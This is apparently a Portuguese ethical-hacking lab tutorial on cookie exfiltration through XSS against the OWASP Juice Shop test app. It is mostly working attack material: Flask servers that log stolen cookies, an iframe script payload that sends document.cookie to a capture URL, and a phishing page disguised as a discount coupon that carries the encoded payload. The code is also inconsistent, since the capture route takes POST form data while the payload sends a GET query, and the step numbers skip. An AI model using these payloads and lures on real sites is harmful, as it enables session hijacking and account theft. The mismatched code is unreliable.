# Cookie Exfiltration

A exfiltração de cookies (ou roubo de cookies) é um ataque em que um invasor intercepta ou extrai os arquivos de cookie de um usuário para se passar por ele em uma aplicação web, contornando o processo de autenticação (mecanismo conhecido como Session Hijacking ou Sequestro de Sessão). Como muitos sistemas utilizam cookies para armazenar tokens de sessão após o login, o invasor que possui esses dados ganha acesso imediato à conta da vítima sem precisar saber sua senha.

 __Cross-Site Scripting (XSS):__
 
- __Como funciona:__ Se uma aplicação web não sanitiza adequadamente as entradas do usuário, um invasor pode injetar um script malicioso (JavaScript) na página.

- __Ação:__ Quando a vítima acessa a página, o script é executado no navegador dela e envia o conteúdo de document.cookie diretamente para um servidor controlado pelo invasor usando comandos como fetch() ou XMLHttpRequest.

## Web-Server Exfiltration Python

1° Copiar o código python e salvar como web-srv.py

2° Executar $python ./web-srv.py

6° Acessar o Juice-Shop http://localhost:3000 e logar com algum usuário

7° Acessar o endereço http://127.0.0.1 e clicar no link de Cupom Promocional

```
#!/usr/bin/env python3
# Treinamento Cibersec e Ethical Hacking 
# Web Server para Cookies Exfiltration

# Template HTML embutido
TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Juice-Shop Cupons</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        h1 {
            color: #0066cc;
            margin-bottom: 20px;
        }
        a {
            color: #fff;
            background-color: #0066cc;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 4px;
            font-weight: bold;
            transition: background-color 0.3s;
        }
        a:hover {
            background-color: #004999;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Refresque o seu dia pagando menos! Pegue seu cupom exclusivo e aproveite 100% de sabor com 30% de desconto</h1>
        <h2>Aviso: Para receber o cupom o cliente deve estar logado no Juice-Shop!</h2>
        <p>Clique no link abaixo para receber seu cupom:</p>
        <a href="http://localhost:3000/#/search?q=%3Ciframe%20srcdoc%3D%22%3Cscript%3E%20fetch%28%27http%3A%2F%2F127.0.0.1%2Fcapture%3Ftoken%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E" target="_blank">Cupom Promocional</a>
    </div>
</body>
</html>
"""

from flask import Flask, request, make_response, render_template_string

app = Flask(__name__)

@app.route('/capture', methods=['POST'])
def capture():
    cookie = request.form.get('cookie')
    with open('captured_cookies.txt', 'a') as f:
        f.write(cookie + '\n')
    return ''

@app.route("/")
def home():
    return render_template_string(TEMPLATE)
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```


## Web-Server Exfiltration Python Basic

1° Copiar o código python e salvar como web-srv.py

2° Executar $python ./web-srv.py

```
#!/usr/bin/env python3
# Treinamento Cibersec e Ethical Hacking 
# Web Server para Cookies Exfiltration Basic

from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/capture', methods=['POST'])
def capture():
    cookie = request.form.get('cookie')
    with open('captured_cookies.txt', 'a') as f:
        f.write(cookie + '\n')
    return ''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```
Payload XSS para teste:

3° Copie o payload e cole no campo de pesquisa do Juice-Shop
```
<iframe srcdoc="<script> fetch('http://127.0.0.1/capture?token='+document.cookie)</script>"></iframe>
```
4°  Verificar no shell o cookie capturado

## Web-Server Exfiltration Python Estruturado

```
Estrutura:
Web-srv
       |_web-srv.py
       |_templates
                  |_index.html
```
1° Criar um diretório com o nome Web-srv

2° Copiar o código python e salvar como web-srv.py dentro do diretório Web-srv

```
#!/usr/bin/env python3
# Treinamento Cibersec e Ethical Hacking 
# Web Server para Cookies Exfiltration Estruturado

from flask import Flask, request, make_response, render_template

app = Flask(__name__)

@app.route('/capture', methods=['POST'])
def capture():
    cookie = request.form.get('cookie')
    with open('captured_cookies.txt', 'a') as f:
        f.write(cookie + '\n')
    return ''

@app.route("/")
def home():
    return render_template("index.html")
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```
3° Criar um diretório como o nome templates dentro do diretório Web-srv

4° Copiar o código html e salvar como index.html dentro do diretório templates

```
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Juice-Shop Cupons</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        h1 {
            color: #0066cc;
            margin-bottom: 20px;
        }
        a {
            color: #fff;
            background-color: #0066cc;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 4px;
            font-weight: bold;
            transition: background-color 0.3s;
        }
        a:hover {
            background-color: #004999;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Refresque o seu dia pagando menos! Pegue seu cupom exclusivo e aproveite 100% de sabor com 30% de desconto</h1>
        <h2>Aviso: Para receber o cupom o cliente deve estar logado no Juice-Shop!</h2>
        <p>Clique no link abaixo para receber seu cupom:</p>
        <a href="http://localhost:3000/#/search?q=%3Ciframe%20srcdoc%3D%22%3Cscript%3E%20fetch%28%27http%3A%2F%2F127.0.0.1%2Fcapture%3Ftoken%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E" target="_blank">Cupom Promocional</a>
    </div>
</body>
</html>
```
5° Executar $python ./web-srv.py

6° Acessar o Juice-Shop http://localhost:3000 e logar com algum usuário

7° Acessar o endereço http://127.0.0.1 e clicar no link de Cupom Promocional

8°  Verificar no shell o cookie capturado
